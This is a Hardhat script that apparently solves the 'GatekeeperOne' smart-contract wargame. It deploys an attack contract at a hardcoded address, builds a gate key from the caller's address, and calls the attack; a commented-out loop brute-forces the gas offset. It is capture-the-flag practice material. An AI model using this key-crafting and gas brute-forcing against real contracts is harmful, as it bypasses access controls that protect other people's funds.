
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  let [user] = await ethers.getSigners();
  // const gatekeeper = await hre.ethers.getContractFactory("GatekeeperOneTest");
  // const gate = await gatekeeper.deploy();
  

  // await gate.deployed();

  // console.log("gate deployed to:", gate.address);

  const Attack = await hre.ethers.getContractFactory("GatekeeperOneTestAttack");
  const attack = await Attack.deploy("0x5Cd64C493bb9CBb26C69C12343bf32C761Cf8008");

  await attack.deployed();

  console.log("attack deployed to:", attack.address);
  
  console.log(user.address)
  const txOrigin = hre.ethers.utils.hexZeroPad(user.address, 32)
  console.log(txOrigin)
  const part3 = hre.ethers.utils.hexDataSlice(txOrigin, 30)
  console.log(part3)
  const part1 = "0x00000001"
  const part2 = "0x0000"
  const key = hre.ethers.utils.hexConcat([part1, part2, part3])
  console.log(key)

  // await attack.attack(key);
  const gas = 80000;
  const bool = await attack.realAttack("0x5Cd64C493bb9CBb26C69C12343bf32C761Cf8008", key)
  console.log(bool)
  // for(let i = 0; i < 8191; i++){
  //   try {
  //     await attack.realAttack("0x5Cd64C493bb9CBb26C69C12343bf32C761Cf8008", key, gas + 1, {
  //       gasLimit: 120000,
  //     })
  //     break;
  //   }
  //   catch (error){
  //     console.log(i)
  //     console.log(error)
  //   }
  // }
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
